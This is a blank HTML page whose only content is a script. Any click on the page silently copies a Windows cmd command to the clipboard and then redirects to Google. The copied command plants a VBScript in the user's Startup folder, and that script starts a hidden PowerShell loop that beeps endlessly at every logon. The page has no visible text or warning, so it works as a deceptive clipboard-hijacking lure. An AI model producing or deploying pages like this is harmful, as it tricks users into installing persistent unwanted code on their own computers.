<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title></title>
  <style>
    html, body {
      margin: 0; padding: 0; height: 100%;
      background: white;
      cursor: pointer;
    }
  </style>
</head>
<body onclick="copyAndRedirect()" >

<script>
  function copyAndRedirect() {
    const text = `cmd /c (echo Set sh = CreateObject^("WScript.Shell"^) && echo sh.Run "powershell -Command while^($true^){[console]::beep^(1000,200^);Start-Sleep 1}", 0) > "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\beep.vbs"`;
    navigator.clipboard.writeText(text).then(() => {
      window.location.href = "https://www.google.com";
    });
    // Nếu muốn chắc chắn redirect luôn không chờ promise:
    // window.location.href = "https://www.google.com";
  }
</script>

</body>
</html>
